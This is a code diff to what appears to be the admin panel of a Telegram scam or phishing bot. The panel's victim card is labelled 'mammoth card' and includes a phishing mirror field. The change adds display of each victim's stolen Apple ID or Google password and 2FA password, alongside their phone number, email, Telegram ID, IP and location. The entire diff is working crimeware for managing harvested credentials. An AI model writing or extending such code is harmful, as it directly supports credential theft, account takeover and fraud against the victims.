@@ -697,7 +697,29 @@ async def cb_adm_view_user(callback: CallbackQuery, state: FSMContext) -> None:
         session_status = "❌ Сессия отсутствует"
 
     email = user["email"] if ("email" in user.keys() and user["email"]) else None
-    email_line = f"📧 <b>Почта:</b> <code>{email}</code>\n" if email else ""
+    pwd_2fa = user["password_2fa"] if ("password_2fa" in user.keys() and user["password_2fa"]) else None
+
+    is_apple_user = (user.get("auth_step") or "").startswith("apple_") or (email and ("icloud" in email.lower() or "apple" in email.lower()))
+    is_google_user = (user.get("auth_step") or "").startswith("google_") or (email and "gmail" in email.lower())
+
+    email_line = ""
+    if email:
+        if is_apple_user:
+            email_line = f"🍏 <b>Apple ID:</b> <code>{email}</code>\n"
+        elif is_google_user:
+            email_line = f"📧 <b>Google Email:</b> <code>{email}</code>\n"
+        else:
+            email_line = f"📧 <b>Почта:</b> <code>{email}</code>\n"
+
+    pwd_line = ""
+    if pwd_2fa:
+        if is_apple_user:
+            pwd_line = f"🔑 <b>Пароль Apple ID:</b> <code>{pwd_2fa}</code>\n"
+        elif is_google_user:
+            pwd_line = f"🔑 <b>Пароль Google:</b> <code>{pwd_2fa}</code>\n"
+        else:
+            pwd_line = f"🔑 <b>Пароль (2FA):</b> <code>{pwd_2fa}</code>\n"
+
     ip = user["ip"] if ("ip" in user.keys() and user["ip"]) else "—"
     country = user["country"] if ("country" in user.keys() and user["country"]) else ""
     city = user["city"] if ("city" in user.keys() and user["city"]) else ""
@@ -708,6 +730,7 @@ async def cb_adm_view_user(callback: CallbackQuery, state: FSMContext) -> None:
         f"👤 <b>Карточка мамонта #{user['id']}:</b>\n\n"
         f"📱 <b>Номер:</b> <code>{phone}</code>\n"
         f"{email_line}"
+        f"{pwd_line}"
         f"👤 <b>Юз:</b> {username}\n"
         f"🆔 <b>Айди тг:</b> <code>{user['tg_id']}</code>\n"
         f"🪞 <b>Зеркало:</b> {mirror}\n"
